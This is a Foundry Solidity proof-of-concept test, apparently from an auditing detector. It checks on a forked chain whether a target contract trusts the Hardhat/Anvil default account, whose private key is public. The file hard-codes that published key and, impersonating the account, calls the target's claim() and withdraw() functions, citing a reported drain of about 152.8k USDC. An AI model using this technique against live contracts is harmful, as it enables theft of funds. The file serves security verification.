// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Trust in a development account whose key is public
/// @notice Detector: public-key-account-trust. The contract grants a privilege
///         (whitelist entry, owner, role, verifier) to a well-known framework
///         account — Hardhat/Anvil #0 and friends — whose private key is
///         published in the tooling's own documentation.
/// @dev FORK-ONLY. Reference incident: AlpsCon AI Trade Hub (October 2026,
///      ~152.8k USDC on BNB Chain) — the reward gate kept the canonical
///      Hardhat account 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 on its
///      onlyVerified whitelist, and the attacker signed an EIP-7702
///      authorization with that published key to pass every gate.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The key below is the public, documented one; nothing here is a secret.
contract PoC is Test {
    /// The published private key of Hardhat/Anvil account #0.
    uint256 internal constant PUBLISHED_PK =
        0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;

    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
        assertEq(vm.addr(PUBLISHED_PK), 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, "published key does not derive the canonical account");
    }

    function test_privilegeHeldByPublicKeyAccount() public {
        address trusted = vm.addr(PUBLISHED_PK);
        vm.deal(trusted, 100 ether);

        uint256 before = address(target).balance;

        // Call the gated path AS the published-key account. Every gate that
        // names this address now passes for anyone who read the docs.
        vm.startPrank(trusted, trusted);
        (bool claimOk,) = target.call(abi.encodeWithSignature("claim()"));
        (bool withdrawOk,) = target.call(abi.encodeWithSignature("withdraw(address,uint256)", trusted, 1 ether));
        vm.stopPrank();

        console.log("claim/withdraw as the public-key account:", claimOk, withdrawOk);
        console.log("target balance before/after:", before, address(target).balance);

        assertTrue(
            claimOk || withdrawOk,
            "neither claim() nor withdraw(address,uint256) returned for the published-key account. This does NOT establish safety: the trusted path may have another name, or the account may hold the privilege in a different role. Confirm from the source which function names this address."
        );
    }
}
